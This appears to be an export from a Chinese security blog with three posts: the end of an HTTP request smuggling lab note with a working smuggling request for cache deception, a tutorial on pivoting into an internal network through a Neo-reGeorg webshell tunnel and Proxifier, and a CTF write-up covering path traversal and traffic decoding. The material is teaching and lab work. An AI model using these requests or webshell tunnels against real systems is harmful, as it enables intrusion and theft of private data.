<li>再寻找到一个可用缓存的js页面（可用导致xss的js）访问。页面会跳转到恶意页面中，并且将恶意内容缓存到服务器上。</li>
<li>打开主页 ⇒ 导致xss</li>
</ul>
<h3 id="缓存欺骗"><a class="markdownIt-Anchor" href="#缓存欺骗"></a> 缓存欺骗</h3>
<p>缓存欺骗：在Web缓存欺骗中，攻击者使应用程序将一些属于另一个用户的敏感内容存储在缓存中，然后攻击者从缓存中检索此内容。</p>
<ul>
<li>寻找一个存在隐私的页面，比如这里的my-account，并且页面返回的内容是可以被缓存的</li>
<li>发送一个走私请求，下一个请求静态资源的请求会跳转到my-acount并把隐私信息缓存</li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>your-lab-id.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>42</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /my-account HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">X</span>-Ignore: X</span></span><br></pre></td></tr></table></figure>
<ul>
<li>打开隐私浏览器加载主页，用Brupsuite搜索隐私内容的关键字。如果成功的话可以在静态资源中搜索到</li>
</ul>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724173247.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724173247.png" alt="img"></a></p>
<p>原理是走私的请求把下一个请求HTTP方法那一行注释，请求会变为：</p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> /<span class="keyword">private</span>/messages HTTP/<span class="number">1.1</span></span><br><span class="line"><span class="symbol">Foo:</span> XGET /<span class="keyword">static</span>/some-image.png HTTP/<span class="number">1.1</span></span><br><span class="line"><span class="symbol">Host:</span> vulnerable-website.com</span><br><span class="line"><span class="symbol">Cookie:</span> sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>技术总结</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈如何利用Neo-reGeorg+Proxifier做跳板机</title>
    <url>/2023/04/%E6%B5%85%E8%B0%88%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Neo-reGeorg+Proxifier%E5%81%9A%E8%B7%B3%E6%9D%BF%E6%9C%BA/</url>
    <content><![CDATA[<p>突发奇想的内网穿透学习外加好大哥的指导，主要是老大哥的手把手指导！！非常感谢Orz。</p>
<span id="more"></span>
<h1 id="浅谈如何利用neo-regeorgproxifier做跳板机"><a class="markdownIt-Anchor" href="#浅谈如何利用neo-regeorgproxifier做跳板机"></a> 浅谈如何利用Neo-reGeorg+Proxifier做跳板机</h1>
<h2 id="regeorgsocksproxy工作原理"><a class="markdownIt-Anchor" href="#regeorgsocksproxy工作原理"></a> reGeorgSocksProxy工作原理</h2>
<p>在渗透过程中，进入到内网之后，由于防火墙的存在，致使我们无法直接从外网主机直接访问到内网主机，发起链接，因此就需要设置端口反弹，如果要对内网中的其他主机进行渗透攻击，就需要通过内网的代理，来对其他主机进行渗透攻击。</p>
<p>例如这里我们发现了一个内网的靶机，但是没法直接链接，就可以通过<code>Neo-reGeorg+Proxifier</code>构建的内网代理隧道<code>Tunnel.php</code>做一个跳板，使用代理主机的内网流量访问其他内网主机，以此来做到一个初步横向和攻击隐藏。</p>
<p><strong>原理图：</strong></p>
<p><img src="/2023/04/%E6%B5%85%E8%B0%88%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Neo-reGeorg+Proxifier%E5%81%9A%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20230413220538532.png" alt></p>
<h3 id="简述neo-regeorg"><a class="markdownIt-Anchor" href="#简述neo-regeorg"></a> 简述Neo-reGeorg</h3>
<p><code>Neo-reGeorg</code> 是<code>reGeorg</code>的重构版，其目的是：</p>
<ul>
<li>提高可用性，避免特征检测</li>
<li>提高 tunnel 连接安全性</li>
<li>提高传输内容保密性</li>
<li>应对更多的网络环境场景下使用</li>
</ul>
<p>主要是把内网服务器的端口通过 <code>http/https</code> 隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。它利用<code> webshell</code> 建立一个 <code>socks</code> 代理进行内网穿透，服务器必须支持<code>php</code>、<code>aspx</code>、<code>ashx</code>、<code>jsp</code>、<code>go</code>这些 web 程序中的一种。</p>
<p><code>reGeorgSocksProxy</code>由服务端和客户端两部分组成。服务端有<code>php</code>、<code>aspx</code>、<code>ashx</code>、<code>jsp</code>、<code>go</code>等多个版本，客户端则由python编写。其工作原理可简单描述为python客户端在本地监听一个端口，提供socks服务，并将数据通过<code>http/https</code>协议发送到服务端上，并从服务端上用socket实现转发。</p>
<h2 id="实验模拟拓扑"><a class="markdownIt-Anchor" href="#实验模拟拓扑"></a> 实验模拟拓扑</h2>
<p>拓扑图如下：</p>
<p><img src="/2023/04/%E6%B5%85%E8%B0%88%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Neo-reGeorg+Proxifier%E5%81%9A%E8%B7%B3%E6%9D%BF%E6%9C%BA/%E5%AE%9E%E9%AA%8C%E6%8B%93%E6%89%91%E5%9B%BE1.png" alt="实验拓扑图1"></p>
<p>由于内容仅供讲解笔记使用，IP皆为举例IP，是无效地址，具体搭建参考拓扑图。</p>
<p>**外网渗透主机：**192.0.0.1</p>
<p>**目标主机：**外网vmnet0网卡模拟，IP地址为192.0.0.1，内网vmnet8模拟，内网地址为192.0.253.123</p>
<p>**内网主机：**网卡为vmnet8模式，IP地址为192.0.253.123，可与目标主机192.0.253.123实现网络互通，但不对外网暴露。通过以上方式模拟内网结构。</p>
<h3 id="主机配置"><a class="markdownIt-Anchor" href="#主机配置"></a> 主机配置</h3>
<h4 id="1-渗透主机生成shell脚本"><a class="markdownIt-Anchor" href="#1-渗透主机生成shell脚本"></a> 1、渗透主机生成shell脚本</h4>
<p>在Neo-reGeorg目录下打开powershell窗口，执行脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python neoreg.py generate -k TWe1v3</span><br></pre></td></tr></table></figure>
<p>图为Neo-reGeorg脚本执行：</p>
<p><img src="/2023/04/%E6%B5%85%E8%B0%88%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Neo-reGeorg+Proxifier%E5%81%9A%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20230421170513920.png" alt="image-20230421170513920"></p>
<h4 id="2-内网代理主机配置"><a class="markdownIt-Anchor" href="#2-内网代理主机配置"></a> 2、内网代理主机配置</h4>
<p>这需要在内网主机中考虑启动一个web服务，我这里直接安装phpstudy，详细安装使用教程请自行google，当然其他的方法也可以。只要能启动web服务用于上传tunnel.php文件就行。</p>
<p>访问上传成功的tunnel.php:</p>
<p><img src="/2023/04/%E6%B5%85%E8%B0%88%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Neo-reGeorg+Proxifier%E5%81%9A%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20230421173359868.png" alt="image-20230421173359868"></p>
<p>直接将生成的webshell脚本放到phpstudy的根目录即可，我这里更改了一下webshell给的访问成功的输出。</p>
<h4 id="3-配置渗透主机代理规则profile-proxification-rules"><a class="markdownIt-Anchor" href="#3-配置渗透主机代理规则profile-proxification-rules"></a> 3、配置渗透主机代理规则：<code>Profile-proxification Rules</code></h4>
<p>代理规则其实就相当于指定那个软件的流量经过代理，哪些不经过代理，一般情况下我们需要使用浏览器访问内网的网页，所以就需要给浏览器配置经过代理，其他不需要代理的软件就这设为direct模式（不经过代理）</p>
<p>127.0.0.1 为socks5 ，python脚本为direct</p>
<h4 id="3-流量互通"><a class="markdownIt-Anchor" href="#3-流量互通"></a> 3、流量互通</h4>
<p><a href="http://xn--neoreg-2y7im02o05mm1tsw8bw3sqxa.py">运行渗透主机的neoreg.py</a><img src="/2023/04/%E6%B5%85%E8%B0%88%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Neo-reGeorg+Proxifier%E5%81%9A%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20230421201640081.png" alt="image-20230421201640081"></p>
<p>这里需要设置一下渗透主机的代理，使用Proxifier代理：</p>
<p><img src="/2023/04/%E6%B5%85%E8%B0%88%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Neo-reGeorg+Proxifier%E5%81%9A%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20230425020828636.png" alt="image-20230425020828636"></p>
<p>设置1080端口。</p>
<h3 id="通过代理连接目标主机3389端口"><a class="markdownIt-Anchor" href="#通过代理连接目标主机3389端口"></a> 通过代理，连接目标主机3389端口</h3>
<h4 id="1-远程桌面登录"><a class="markdownIt-Anchor" href="#1-远程桌面登录"></a> 1、远程桌面登录。</h4>
<p>打开本地远程桌面，右击mstsc.exe用Proxifier中的<code>Proxy SOCKS 5 127.0.0.1</code>打开。</p>
]]></content>
      <categories>
        <category>渗透学习</category>
      </categories>
      <tags>
        <tag>技术学习</tag>
        <tag>渗透</tag>
        <tag>代理</tag>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>红明谷CTF-2023--个人Writeup</title>
    <url>/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/</url>
    <content><![CDATA[<p>这比赛还是蛮可惜的，差一道题没交上，痛失一个线下面基师傅们的机会T_T</p>
<span id="more"></span>
<h1 id="红明谷ctf-2023个人writeup"><a class="markdownIt-Anchor" href="#红明谷ctf-2023个人writeup"></a> 红明谷CTF-2023–个人Writeup</h1>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> WEB</h2>
<h3 id="点击签到"><a class="markdownIt-Anchor" href="#点击签到"></a> <strong>点击签到</strong></h3>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAABY8QiNb7ZTAnAjZDBoIJjTbXPbRr.png" alt="img"></p>
<p>连续点击即可获取flag：</p>
<p>flag{1efe5dac-692a-47b8-b32d-ff737af384a7}</p>
<h3 id="dreamer"><a class="markdownIt-Anchor" href="#dreamer"></a> <strong>Dreamer</strong></h3>
<p>访问管理员目录/admin</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">uername:</span>wangjn</span><br><span class="line"><span class="symbol">password:</span><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>栏目文章管理处，创建顶级栏目</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAABY8QiNYE_JFyU4ZHAJBLMRufmflv.png" alt="img"></p>
<p>设置栏目</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAABY8QiNbbkAAlSd9Ck689zHiaRd0Y.png" alt="img"></p>
<p>目录穿越，任意文章读取</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAABY8QiNZ6rF3cihNPxqj3BB9URFMi.png" alt="img"></p>
<p>主页访问栏目flag</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAABY8QiNZze8YHvN5DKLGTRJBPDVm8.png" alt="img"></p>
<p>flag{9dce33c6-3a2b-4235-a35c-86401e8df9b2}</p>
<h3 id="dreamer_revenge"><a class="markdownIt-Anchor" href="#dreamer_revenge"></a> <strong>Dreamer_revenge</strong></h3>
<p>访问管理员目录/admin</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">uername:</span>wangjn</span><br><span class="line"><span class="symbol">password:</span><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>直接构造一个主题包，里面修改路径，可读所有文件</p>
<p>找到dreamer_cms-Previous_Releases_4.1.3/src/main/resources/db/dreamer-cms/templates文件夹</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVK0kkKZba5NW6nHDH9C2-KU.png" alt="img"></p>
<p>修改default_v2文件夹下的theme.json文件的themePath</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVJTRkCC9aZCC4bp7TQCxwRh.png" alt="img"></p>
<p>改为…/…/…/…/…/…/…/…/…/…/…/…/…/…/，然后将default_v2压缩成zip包即可</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAABY8QiNaf4wAPc-RJk7v3y1mmM8dR.png" alt="img"><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAABY8QiNYGfhQ5x9pFzqL0JOhu8dx5.png" alt="img"></p>
<p>启用新主题，找flag的路径：</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAABY8QiNYFNzsBlCNP1YeVPzLL4qsF.png" alt="img"></p>
<p>flag路径：  /proc/1/environ</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAABY8QiNbnbUIWuPNI97f9mschRuvL.png" alt="img"></p>
<p>flag{bfd78316-a136-45e7-b04b-35af29af8313}</p>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2>
<h3 id="hacker"><a class="markdownIt-Anchor" href="#hacker"></a> <strong>hacker</strong></h3>
<p>打开看见流量包</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVLzFwbzAY5Kl4g6AwutqxD3.png" alt="img"></p>
<p>提取http流量url解密并审查shell.php，发现是dnslog注入</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVIzEeKyaWhDZ78kVncHWfjU.png" alt="img"></p>
<p>通过审计上面代码发现是将数据和admin的md5后的密码异或后再短域名拼接后发送</p>
<p>发现SQL注入泄露admin密码的MD5</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVLJ7DaaXwNNr6dos9E5bTSG.png" alt="img"></p>
<p>再看DNS流量包</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVIy72j6btJP45aLNlzzGhDO.png" alt="img"></p>
<p>写脚本辅助解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc_data = <span class="string">b&quot;&quot;</span></span><br><span class="line">enc_data += binascii.unhexlify(<span class="string">b&#x27;7b357226771575227a7372237677702573611f372570317b76727720762066&#x27;</span>)</span><br><span class="line">key = <span class="string">&quot;8a3e684c923b763d252cf1e8734a7a29&quot;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    dec_data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(enc_data):</span><br><span class="line">        dec_data += <span class="built_in">bytes</span>([byte ^ <span class="built_in">ord</span>(key[(i+k) % <span class="built_in">len</span>(key)])])</span><br><span class="line">    <span class="built_in">print</span>(dec_data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>脚本解出部分flag，但部分包数据不可解密</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVJhzg5K3F5JDqgVLQrYJIVy.png" alt="img"></p>
<p>其中报文有部分错误，通过爆破发现在3段满62字符长数据后都添加6就可以得到真实密文为</p>
<p>ACCAGTAAAACG{AATTCAACAACATGCTGC4CTACA-AACAAAAACAAT-TCATCAACAAAR-AACAACTGGTGA-TTCTTCTCATGATGAAA4AACTTCTTCTGCTGC}</p>
<p>魔改这个DNA解密脚本<a href="https://github.com/karma9874/DNA-Cipher-Script-CTF">karma9874/DNA-Cipher-Script-CTF: A simple script to decode the genome DNA binary sequence (CTF Challenge) (github.com)</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mapping = &#123; <span class="string">&#x27;AAA&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;AAC&#x27;</span>: <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;AAG&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;AAT&#x27;</span>: <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;ACA&#x27;</span>: <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;ACC&#x27;</span>: <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;ACG&#x27;</span>: <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;ACT&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;AGA&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;AGC&#x27;</span>: <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;AGG&#x27;</span>: <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;AGT&#x27;</span>: <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;ATA&#x27;</span>: <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;ATC&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;ATG&#x27;</span>: <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;ATT&#x27;</span>: <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;CAA&#x27;</span>: <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;CAC&#x27;</span>: <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;CAG&#x27;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;CAT&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;CCA&#x27;</span>: <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;CCC&#x27;</span>: <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;CCG&#x27;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;CCT&#x27;</span>: <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;CGA&#x27;</span>: <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;CGC&#x27;</span>: <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;CGG&#x27;</span>: <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;CGT&#x27;</span>: <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;CTA&#x27;</span>: <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;CTC&#x27;</span>: <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;CTG&#x27;</span>: <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;CTT&#x27;</span>: <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;GAA&#x27;</span>: <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;GAC&#x27;</span>: <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;GAG&#x27;</span>: <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;GAT&#x27;</span>: <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;GCA&#x27;</span>: <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;GCC&#x27;</span>: <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;GCG&#x27;</span>: <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;GCT&#x27;</span>: <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;GGA&#x27;</span>: <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;GGC&#x27;</span>: <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;GGG&#x27;</span>: <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;GGT&#x27;</span>: <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;GTA&#x27;</span>: <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;GTC&#x27;</span>: <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;GTG&#x27;</span>: <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;GTT&#x27;</span>: <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;TAA&#x27;</span>: <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;TAC&#x27;</span>: <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;TAG&#x27;</span>: <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;TAT&#x27;</span>: <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;TCA&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;TCC&#x27;</span>: <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;TCG&#x27;</span>: <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;TCT&#x27;</span>: <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;TGA&#x27;</span>: <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;TGC&#x27;</span>: <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;TGG&#x27;</span>: <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;TGT&#x27;</span>: <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;TTA&#x27;</span>: <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;TTC&#x27;</span>: <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;TTG&#x27;</span>: <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;TTT&#x27;</span>: <span class="string">&#x27;.&#x27;</span> &#125;</span><br><span class="line"><span class="keyword">const</span> data = <span class="string">&quot;ACCAGTAAAACG&#123;AATTCAACAACATGCTGC4CTACA-AACAAAAACAAT-TCATCAACAAAR-AACAACTGGTGA-TTCTTCTCATGATGAAA4AACTTCTTCTGCTGC&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> flags = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> ra <span class="keyword">of</span> [<span class="string">&quot;A&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;T&quot;</span>]) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> rb <span class="keyword">of</span> [<span class="string">&quot;A&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;T&quot;</span>]) &#123;</span><br><span class="line">    <span class="keyword">const</span> tmp = data.<span class="title function_">replaceAll</span>(<span class="string">&quot;4&quot;</span>, ra).<span class="title function_">replaceAll</span>(<span class="string">&quot;R&quot;</span>, rb);</span><br><span class="line">    <span class="keyword">const</span> groups = tmp.<span class="title function_">split</span>(<span class="regexp">/-|\&#123;|\&#125;/</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> datum <span class="keyword">of</span> groups) &#123;</span><br><span class="line">      <span class="keyword">const</span> slices = [...(datum.<span class="title function_">matchAll</span>(<span class="regexp">/[A-Z0-9]&#123;3&#125;/g</span>))]</span><br><span class="line">      <span class="keyword">let</span> flag_slice = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> slice <span class="keyword">of</span> slices) &#123;</span><br><span class="line">        flag_slice += mapping[slice[<span class="number">0</span>]];</span><br><span class="line">      &#125;</span><br><span class="line">      flags.<span class="title function_">push</span>(flag_slice);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> flag = flags.<span class="title function_">join</span>(<span class="string">&quot;-&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/flag-/</span>, <span class="string">&quot;flag&#123;&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/-$/</span>, <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="regexp">/flag\&#123;[a-f0-9\-]+\&#125;/</span>).<span class="title function_">test</span>(flag)) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(flag);</span><br><span class="line">    &#125;</span><br><span class="line">    flags = [];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;d1ee664e-babd-<span class="number">11</span>ea-bb75-<span class="number">00155</span>db0066&#125;</span><br><span class="line"><span class="attribute">flag</span>&#123;d1ee664e-babd-<span class="number">11</span>eb-bb75-<span class="number">00155</span>db0066&#125;</span><br><span class="line"><span class="attribute">flag</span>&#123;d1ee664e-babd-<span class="number">11</span>ec-bb75-<span class="number">00155</span>db0066&#125;</span><br><span class="line"><span class="attribute">flag</span>&#123;d1ee664e-babd-<span class="number">11</span>ed-bb75-<span class="number">00155</span>db0066&#125;</span><br></pre></td></tr></table></figure>
<p>爆破出来四个flag，依次提交，最后正确flag为：</p>
<p>flag{d1ee664e-babd-11ed-bb75-00155db0066}</p>
<h3 id="阿尼亚"><a class="markdownIt-Anchor" href="#阿尼亚"></a> <strong>阿尼亚</strong></h3>
<p>打开发现</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVJUzn7bcutMjqxqdiKNgEhJ.png" alt="img"></p>
<p>图片名为netpixeljihad，猜测为pixeljihad加密，需要密码</p>
<p>010打开图片十六进制，在文件尾发现字符</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVIYpMRRvChGX5WNRvnxT2FS.png" alt="img"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">6333383363333963633338326333616263333865633261616332613363326261633262636333623263326235633261356332623563333834633262316333613063333832633361623061</span><br></pre></td></tr></table></figure>
<p>cyberchef开梭2次hex后直接爆破</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVIztk02uANMJ7V5Z-SD9MLY.png" alt="img"></p>
<p>找到密码为简答的编码，解密</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVIApSOOUNtGkINauMcg8Pq1.png" alt="img"></p>
<p>得到压缩包密码</p>
<p>解压flag压缩包</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVLi2GUdGHhPxbcTTSj5sK8Z.png" alt="img"></p>
<p>密文为两种字符，尝试01，错误</p>
<p>dcode.fr开梭，发现为十位密码</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVKA4dnNXOxNNqN6Znt9M9L5.png" alt="img"></p>
<p>得到flag</p>
<h3 id="x光的秘密"><a class="markdownIt-Anchor" href="#x光的秘密"></a> X光的秘密</h3>
<p>PS逐帧查看图片发现最后三帧图片一样的，编写脚本按帧导出：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pydicom</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">dcm = pydicom.dcmread(<span class="string">&#x27;task.dcm&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i, image <span class="keyword">in</span> <span class="built_in">enumerate</span>(dcm.pixel_array):</span><br><span class="line">    img = Image.fromarray(image)</span><br><span class="line">    img.save(<span class="string">f&#x27;Xray_<span class="subst">&#123;i&#125;</span>.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>或者在线网站直接DCM转PNG也可以（<a href="https://products.aspose.app/imaging/zh-hans/conversion/dcm-to-png/%EF%BC%89">https://products.aspose.app/imaging/zh-hans/conversion/dcm-to-png/）</a></p>
